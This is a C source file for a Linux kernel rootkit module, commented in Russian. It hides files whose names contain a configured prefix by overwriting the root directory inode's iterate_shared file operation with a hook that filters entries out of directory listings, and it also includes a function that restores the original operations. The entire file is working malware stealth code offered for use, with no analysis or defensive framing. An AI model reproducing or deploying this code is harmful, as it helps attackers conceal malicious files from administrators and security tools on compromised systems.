/*
 * file_hide.c
 *
 * Модуль руткита, который скрывает файл, по его префиксу.
 *
 * По умолчанию префикс файла, которого нужно скрыть расположена в константе HIDE_FILE_TO_PREFIX
 * в заголовочном файле example_config.h
 *
 */

#include "headers.h"

struct file_operations proc_fops;
static const struct file_operations *backup_proc_fops;
struct inode *proc_inode;

static struct dir_context *backup_ctx;

static int rootkit_filldir (struct dir_context *ctx, const char *file_name, int len,
		loff_t off, u64 ino, unsigned int d_type)
{
	if (strstr(file_name, HIDE_FILE_TO_PREFIX) != NULL)
	{
		printk(KERN_INFO "+++ Hide file :%s is OK !\n",file_name);
		return 0;
	}

	return backup_ctx->actor(backup_ctx, file_name, len, off, ino, d_type);
}

static struct dir_context rootkit_ctx = {
		.actor = rootkit_filldir,
};

static int rootkit_hook_iterate_shared(struct file *file, struct dir_context *ctx)
{
	int result = 0;
	rootkit_ctx.pos = ctx->pos;
	backup_ctx = ctx;
	result = backup_proc_fops->iterate_shared(file, &rootkit_ctx);
	ctx->pos = rootkit_ctx.pos;

	return result;
}

//Интерфейсная функция инициализации модуля скрытия файлов по префиксу

int start_rootkit_file_hide (void)
{
	struct path p;

	/* Получить структуру файловых операций fs*/
	/*
	 * FIXME ВАЖНО, ФАЙЛЫ БУДУТ СКРЫТЫ ТОЛЬКО В "/"
	 */
	if(kern_path("/", 0, &p)) {
		printk(KERN_INFO "+++ Dont get fs\n");
		return (-1);
	}

	/* Получить указатель на inode*/
	proc_inode = p.dentry->d_inode;

	/* Получить указатель на file_operations из inode */
	proc_fops = *proc_inode->i_fop;

	/* Беккапим структуру */
	backup_proc_fops = proc_inode->i_fop;

	/* Модифицируем структуру, что-бы вызывалась наша функция */
	proc_fops.iterate_shared = rootkit_hook_iterate_shared;

	/* Перезаписываем активные файловые операции */
	proc_inode->i_fop = &proc_fops;

	return 0;
}

int stop_rootkit_file_hide (void)
{
	struct path p;
	struct inode *proc_inode;

	if(kern_path("/", 0, &p))
	{
		printk(KERN_INFO "+++ Dont get procfs\n");
		return (-1);
	}

	proc_inode = p.dentry->d_inode;
	proc_inode->i_fop = backup_proc_fops;

	return 0;
}

